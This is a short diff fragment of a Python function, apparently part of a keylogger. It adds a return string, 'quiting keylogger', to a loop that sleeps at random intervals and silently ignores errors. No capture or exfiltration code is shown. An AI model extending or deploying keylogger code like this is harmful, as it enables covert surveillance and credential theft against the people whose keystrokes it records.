@@ -110,3 +110,4 @@ def run(*args):
             time.sleep(random.randint(360, 400))
         except:
             continue
+    return "quiting keylogger"
